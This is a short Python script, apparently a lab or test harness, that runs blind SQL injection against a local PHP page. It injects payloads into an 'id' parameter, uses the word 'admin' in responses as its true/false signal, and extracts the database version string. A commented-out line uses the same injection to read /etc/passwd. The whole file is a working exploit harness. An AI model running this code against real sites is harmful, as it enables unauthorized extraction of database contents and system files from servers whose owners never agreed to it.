#! /usr/bin/python3

import requests

from pysqli.blindtester import BlindTester
from pysqli.blind_string_finder import BlindStringFinder

tester = BlindTester(
    lambda payload : requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload), 'log': '1'}),
    lambda r: 'admin' in r.text)

sf = BlindStringFinder(tester)

# sf.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou')))
# print(sf.read_file('/etc/passwd'))

print(sf.read_string("(SELECT version())"))
